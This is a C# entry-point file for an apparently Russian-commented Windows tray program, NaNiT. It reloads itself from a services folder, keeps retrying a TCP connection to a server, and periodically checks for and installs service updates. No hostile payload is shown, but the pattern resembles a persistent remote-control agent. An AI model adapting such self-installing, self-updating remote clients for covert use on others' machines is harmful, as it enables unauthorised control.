using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Timer = System.Threading.Timer;

namespace NaNiT
{
    class Program
    {
        public static NotifyIcon notifyIcon = null;
        public static TcpClient client;
        public static NetworkStream stream;
        public static TimerCallback Upd = new TimerCallback(CheckServiceUpdate);

        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Functions.FirstRunOptionsLoad();                                /// Первоначальная настройка. Загрузка из реестра и прописывание некоторых параметров
            Functions.AutoSelfInstall(false);                               /// Копирование себя в папку сервисов, запуск оттуда удаление лишнего           
            CFunc.Chat();                                                   /// Старт соединения с сервером

            Timer UpdateTimer = new Timer(Upd, null, 0, 3000000);

            Application.Run();
        }


        public static void CheckServiceUpdate(object obj)
        {
            Thread t2 = Thread.CurrentThread;
            t2.Name = "Update Timer";
            ServiceWork.CheckUpdServer();
            ServiceWork.ServiceInit();
            Thread.Sleep(5000);

            if (Globals.adrUpdNum != -1)
                if (Globals.nanitSvcVer != Globals.updVerAvi)
                {
                    ServiceWork.UpdateService();
                }
        }
        public static void TempServConnect(int i)
        {
            if (i == 1)
            {
                Thread ServConnect = new Thread(new ThreadStart(TryServConnect));
                ServConnect.Name = "Try Connect Timer";
                ServConnect.Start();
            }

            void TryServConnect()
            {
                while(!Globals.serverIsConnected)
                {
                    CFunc.Chat();
                    Thread.Sleep(10000);
                    if (Globals.serverIsConnected)
                        CFunc.SendMessage(@"CH@T_AlL_-Подключение восстановлено");
                }
                    
            }
        }
    }
}